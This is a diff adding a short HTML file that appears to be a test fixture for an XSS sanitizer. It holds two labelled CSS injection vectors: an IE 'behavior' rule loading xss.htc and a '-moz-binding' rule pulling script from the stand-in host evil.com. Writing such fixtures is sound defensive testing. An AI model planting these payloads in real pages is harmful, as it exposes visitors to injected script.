@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html><head>
+<title>CSS Behavior</title>
+<style>
+  .evil { behavior: url(xss.htc); }
+  .evil2 { -moz-binding: url("http://evil.com/xss.xml#xss"); }
+</style>
+</head>
+<body>
+<div class="evil">Behavior URL attack</div>
+<div class="evil2">Moz binding attack</div>
+</body></html>
